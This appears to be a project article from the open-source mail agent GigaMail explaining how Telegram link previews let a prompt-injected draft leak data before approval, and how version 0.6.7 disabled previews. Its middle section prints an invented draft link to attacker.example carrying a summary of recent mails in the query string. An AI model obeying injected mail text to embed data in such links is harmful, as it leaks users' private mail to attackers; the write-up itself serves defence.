A link preview sent data out before anyone approved the draft.

The approval step exists so that nothing leaves without a person looking at it. A chat app can undo that by itself, just by drawing a preview.

The draft that leaked while waiting

In GigaMail the agent never sends mail. It writes a draft, and the draft goes to the person for approval: on the PC, or as a message on the phone through Telegram. Sending happens only after that approval, outside the agent's reach.

Now picture an agent that has just read a hostile mail, and writes a draft that contains a link with something in its query string:

Hello, the file is here:
https://attacker.example/?d=SUMMARY-OF-THE-LAST-MAILS

An invented draft and an invented address. The data is whatever the hostile mail talked the agent into putting there.

The person never taps approve. It does not matter. As the 0.6.7 changelog describes it, Telegram fetches the first link of a message from its own servers to build a preview, as soon as the message is sent. When the draft reached the phone to be approved, the address was already requested, query string included. The data had left whether the draft was approved or rejected.

Why it is easy to miss

Nobody did anything wrong in the usual sense. The agent wrote a draft. GigaMail showed it for approval. The chat app did what chat apps do. Each step is reasonable, and together they open a path out that the approval step was supposed to close.

The approval gate guards the act of sending. Showing the draft is a different act, and showing is not always passive: a client that unfurls links turns "display this text" into "make a request to this address".

What we changed

Since 0.6.7 every text GigaMail sends to Telegram is sent with the link preview disabled. The change is in the single function all Telegram calls go through, so no message type is left out, and the example notify command shipped in the policy file does the same. SECURITY.md states it as a rule: a draft shown for approval does not make Telegram's servers open its links.

This is the same idea as the one in the article on hidden text: the person and the machine should be shown the same thing, and what is shown should not trigger anything.

What it does not solve

  • The link is still in the draft. If the person approves it, it goes out in the mail, and whoever receives it can open it. The approval preview is where to look at links before approving.
  • Other places that draw agent output. Any channel that shows what an agent wrote and unfurls links, such as a chat app or a ticket tool, has the same shape. We have not tested other products and do not say which ones behave this way; if you wire an agent to one, check what it does with the first link of a message.
  • Telegram's own behaviour is described here as our changelog records it. We did not open Telegram's documentation for this article, and it may change.

If you build something that shows an agent's output to a person for approval: look at what the screen does with the text before the person has decided anything.

GigaMail is open source (AGPL-3.0). The fix is described under v0.6.7 in the changelog. Sources: GigaMail CHANGELOG.md (v0.6.7, "Telegram messages have no link preview") and SECURITY.md (Telegram messages are sent with link previews disabled).
